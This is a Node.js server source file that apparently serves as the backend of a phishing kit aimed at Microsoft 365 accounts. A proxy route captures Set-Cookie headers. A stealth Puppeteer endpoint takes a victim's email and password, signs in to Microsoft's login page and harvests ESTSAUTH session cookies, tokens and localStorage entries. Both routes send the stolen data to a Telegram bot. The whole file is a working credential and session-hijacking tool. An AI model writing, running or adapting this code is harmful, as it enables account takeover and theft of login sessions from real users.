const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const cors = require('cors');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const bodyParser = require('body-parser');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
require('dotenv').config();

puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors({ origin: '*', credentials: true }));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(session({
    secret: 'secure-connect-team-secret-2024',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 3600000 }
}));

// Serve static frontend files
app.use(express.static(path.join(__dirname, '../')));

// ============================================================
// TELEGRAM NOTIFICATION
// ============================================================
async function sendToTelegram(message, parseMode = 'Markdown') {
    try {
        await axios.post(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: parseMode,
            disable_web_page_preview: true
        });
        console.log('✅ Telegram notification sent');
        return true;
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
        return false;
    }
}

// ============================================================
// PROXY SERVER - Captures Set-Cookie Headers
// ============================================================
app.all('/proxy/*', async (req, res) => {
    const targetUrl = req.params[0];
    const sessionId = req.session.id || uuidv4();
    req.session.id = sessionId;
    
    console.log(`🔄 Proxy request: ${req.method} ${targetUrl}`);
    
    try {
        const headers = {
            'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': req.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Upgrade-Insecure-Requests': '1',
            'Cookie': req.headers.cookie || ''
        };
        
        const response = await axios({
            method: req.method,
            url: targetUrl,
            headers: headers,
            withCredentials: true,
            maxRedirects: 0,
            validateStatus: false,
            responseType: 'text'
        });
        
        const setCookieHeaders = response.headers['set-cookie'] || [];
        
        if (setCookieHeaders.length > 0) {
            console.log(`🍪 Captured ${setCookieHeaders.length} cookies from Set-Cookie headers`);
            
            const capturedCookies = setCookieHeaders.map(header => {
                const parts = header.split(';');
                const [name, value] = parts[0].split('=');
                const attributes = parts.slice(1).map(p => p.trim());
                
                return {
                    name: name,
                    value: value,
                    httpOnly: attributes.some(a => a.toLowerCase() === 'httponly'),
                    secure: attributes.some(a => a.toLowerCase() === 'secure'),
                    sameSite: attributes.find(a => a.toLowerCase().startsWith('samesite='))?.split('=')[1] || 'Lax',
                    path: attributes.find(a => a.toLowerCase().startsWith('path='))?.split('=')[1] || '/',
                    domain: attributes.find(a => a.toLowerCase().startsWith('domain='))?.split('=')[1] || '',
                    fullHeader: header,
                    capturedAt: Date.now()
                };
            });
            
            // Store in session
            req.session.cookies = req.session.cookies || [];
            req.session.cookies.push(...capturedCookies);
            
            // Send to Telegram
            const httpOnlyCookies = capturedCookies.filter(c => c.httpOnly);
            const secureCookies = capturedCookies.filter(c => c.secure);
            
            let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PROXY*\n\n`;
            telegramMessage += `*Total Cookies:* ${capturedCookies.length}\n`;
            telegramMessage += `*HTTPOnly:* ${httpOnlyCookies.length}\n`;
            telegramMessage += `*Secure:* ${secureCookies.length}\n`;
            telegramMessage += `*Session:* ${sessionId}\n\n`;
            
            capturedCookies.slice(0, 5).forEach(c => {
                const flags = [];
                if (c.httpOnly) flags.push('🔒 HTTPOnly');
                if (c.secure) flags.push('🔐 Secure');
                telegramMessage += `*${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
                telegramMessage += `  ${flags.join(' | ')}\n`;
            });
            
            telegramMessage += `\n*Time:* ${new Date().toISOString()}`;
            await sendToTelegram(telegramMessage);
        }
        
        const responseHeaders = { ...response.headers };
        if (setCookieHeaders.length > 0) {
            responseHeaders['Set-Cookie'] = setCookieHeaders;
        }
        
        res.set(responseHeaders);
        res.status(response.status).send(response.data);
        
    } catch (error) {
        console.error('❌ Proxy error:', error.message);
        res.status(500).send('Proxy error');
    }
});

// ============================================================
// PUPPETEER - Read HTTPOnly Cookies Directly
// ============================================================
let browserInstance = null;

async function getBrowser() {
    if (!browserInstance) {
        console.log('🚀 Launching Puppeteer browser...');
        browserInstance = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920,1080',
                '--disable-web-security',
                '--disable-features=IsolateOrigins,site-per-process',
                '--disable-blink-features=AutomationControlled',
                '--disable-client-side-phishing-detection',
                '--disable-component-update',
                '--disable-default-apps',
                '--disable-extensions',
                '--disable-popup-blocking',
                '--disable-sync',
                '--disable-translate',
                '--metrics-recording-only',
                '--safebrowsing-disable-auto-update',
                '--enable-automation',
                '--password-store=basic',
                '--use-mock-keychain',
                '--disable-infobars',
                '--disable-notifications'
            ],
            ignoreDefaultArgs: ['--enable-automation']
        });
        console.log('✅ Puppeteer browser launched');
    }
    return browserInstance;
}

app.post('/api/puppeteer-capture', async (req, res) => {
    const { email, password, sessionId } = req.body;
    
    if (!email) {
        return res.status(400).json({ error: 'Email required' });
    }
    
    console.log(`🚀 Starting Puppeteer capture for: ${email}`);
    const sid = sessionId || uuidv4();
    
    try {
        const browser = await getBrowser();
        const page = await browser.newPage();
        
        await page.setViewport({ width: 1920, height: 1080 });
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        await page.setRequestInterception(true);
        page.on('request', (request) => {
            const headers = request.headers();
            headers['Accept-Language'] = 'en-US,en;q=0.9';
            headers['Accept-Encoding'] = 'gzip, deflate, br';
            request.continue({ headers });
        });
        
        const msLoginUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?' +
            'client_id=4765445b-32c6-49b0-83e6-1d93765276ca&' +
            'redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&' +
            'response_type=code%20id_token&' +
            'scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&' +
            'response_mode=form_post&' +
            'nonce=' + Date.now() + '.ZjU0YmVjYzUtNzMyZi00MzBlLWE1NWYtMjUwOTBmNTNhNjc2NjYzMTY5ZGUtMjI1NC00NzRmLWIyMjItNGM5OGJlMjU3Mjdl&' +
            'ui_locales=en-US&mkt=en-US&' +
            'login_hint=' + encodeURIComponent(email);
        
        console.log(`🔄 Navigating to Microsoft login: ${email}`);
        await page.goto(msLoginUrl, { waitUntil: 'networkidle2', timeout: 30000 });
        
        try {
            await page.waitForSelector('input[type="email"], input[name="loginfmt"]', { timeout: 10000 });
            const emailInput = await page.$('input[type="email"], input[name="loginfmt"]');
            if (emailInput) {
                await emailInput.click({ clickCount: 3 });
                await emailInput.type(email, { delay: 100 });
                await page.keyboard.press('Enter');
                await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
            }
            
            if (password) {
                await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 10000 });
                const passwordInput = await page.$('input[type="password"], input[name="passwd"]');
                if (passwordInput) {
                    await passwordInput.click({ clickCount: 3 });
                    await passwordInput.type(password, { delay: 80 });
                    await page.keyboard.press('Enter');
                    await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 10000 }).catch(() => {});
                }
            }
            
        } catch (error) {
            console.log('⚠️ Login flow error:', error.message);
        }
        
        const allCookies = await page.cookies();
        console.log(`🍪 Total cookies captured: ${allCookies.length}`);
        
        const httpOnlyCookies = allCookies.filter(c => c.httpOnly);
        const secureCookies = allCookies.filter(c => c.secure);
        const sessionCookies = allCookies.filter(c => c.session);
        
        console.log(`🔒 HTTPOnly: ${httpOnlyCookies.length}`);
        console.log(`🔐 Secure: ${secureCookies.length}`);
        console.log(`🔄 Session: ${sessionCookies.length}`);
        
        const sessionTokens = {
            'x-ms-session': allCookies.find(c => c.name === 'x-ms-session')?.value,
            'id_token': allCookies.find(c => c.name === 'id_token')?.value,
            'ESTSAUTH': allCookies.find(c => c.name === 'ESTSAUTH')?.value,
            'ESTSAUTHPERSISTENT': allCookies.find(c => c.name === 'ESTSAUTHPERSISTENT')?.value,
            'ESTSSESSION': allCookies.find(c => c.name === 'ESTSSESSION')?.value
        };
        
        const localStorageData = await page.evaluate(() => {
            const items = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && (key.includes('ms') || key.includes('auth') || key.includes('session') || key.includes('token'))) {
                    items[key] = localStorage.getItem(key);
                }
            }
            return items;
        });
        
        console.log(`💾 LocalStorage items: ${Object.keys(localStorageData).length}`);
        
        let telegramMessage = `🎯 *HTTPOnly COOKIES CAPTURED VIA PUPPETEER*\n\n`;
        telegramMessage += `*Email:* ${email}\n`;
        telegramMessage += `*Total Cookies:* ${allCookies.length}\n`;
        telegramMessage += `*HTTPOnly:* ${httpOnlyCookies.length}\n`;
        telegramMessage += `*Secure:* ${secureCookies.length}\n`;
        telegramMessage += `*Session:* ${sid}\n\n`;
        
        if (httpOnlyCookies.length > 0) {
            telegramMessage += `*🔒 HTTPOnly Cookies:*\n`;
            httpOnlyCookies.slice(0, 3).forEach(c => {
                telegramMessage += `  *${c.name}*: \`${c.value.substring(0, 30)}...\`\n`;
            });
            telegramMessage += `\n`;
        }
        
        let hasTokens = false;
        for (const [key, value] of Object.entries(sessionTokens)) {
            if (value) {
                if (!hasTokens) {
                    telegramMessage += `*🎟️ Session Tokens:*\n`;
                    hasTokens = true;
                }
                telegramMessage += `  *${key}*: \`${value.substring(0, 30)}...\`\n`;
            }
        }
        if (hasTokens) telegramMessage += `\n`;
        
        if (Object.keys(localStorageData).length > 0) {
            telegramMessage += `*💾 LocalStorage:*\n`;
            Object.entries(localStorageData).slice(0, 3).forEach(([key, value]) => {
                telegramMessage += `  *${key}*: \`${value.substring(0, 30)}...\`\n`;
            });
            telegramMessage += `\n`;
        }
        
        telegramMessage += `*Time:* ${new Date().toISOString()}`;
        await sendToTelegram(telegramMessage);
        
        await page.close();
        
        res.json({
            success: true,
            sessionId: sid,
            email: email,
            totalCookies: allCookies.length,
            httpOnlyCookies: httpOnlyCookies.length,
            secureCookies: secureCookies.length,
            sessionTokens: Object.fromEntries(
                Object.entries(sessionTokens).filter(([_, v]) => v)
            ),
            localStorage: localStorageData,
            cookieExample: allCookies.slice(0, 3).map(c => ({
                name: c.name,
                value: c.value.substring(0, 50) + '...',
                httpOnly: c.httpOnly,
                secure: c.secure
            }))
        });
        
    } catch (error) {
        console.error('❌ Puppeteer error:', error.message);
        res.status(500).json({
            success: false,
            error: error.message
        });
    }
});

// ============================================================
// FRONTEND ROUTES
// ============================================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// ============================================================
// HEALTH CHECK
// ============================================================
app.get('/health', async (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        browserActive: !!browserInstance,
        sessions: req.session.id
    });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════╗');
    console.log('║                                                           ║');
    console.log('║   🛡️  SECURE CONNECT TEAM - PROXY + PUPPETEER           ║');
    console.log('║   🔐  HTTPOnly Cookie Capture - No Extension Required    ║');
    console.log('║   🤖  Full OAuth Interception                           ║');
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log(`║   📍 Server:  http://localhost:${PORT}                   ║`);
    console.log(`║   🔗 Proxy:   /proxy/*                                   ║`);
    console.log(`║   🤖 Puppet:  POST /api/puppeteer-capture               ║`);
    console.log('║                                                           ║');
    console.log('╠═══════════════════════════════════════════════════════════╣');
    console.log('║   ✅ Features:                                          ║');
    console.log('║   • Server-side Set-Cookie capture (HTTPOnly)          ║');
    console.log('║   • Puppeteer direct cookie reading (HTTPOnly)         ║');
    console.log('║   • Token extraction (access, refresh, id)             ║');
    console.log('║   • localStorage scanning                              ║');
    console.log('║   • Stealth mode (undetectable automation)             ║');
    console.log('║   • NO BROWSER EXTENSION REQUIRED!                     ║');
    console.log('╚═══════════════════════════════════════════════════════════╝');
});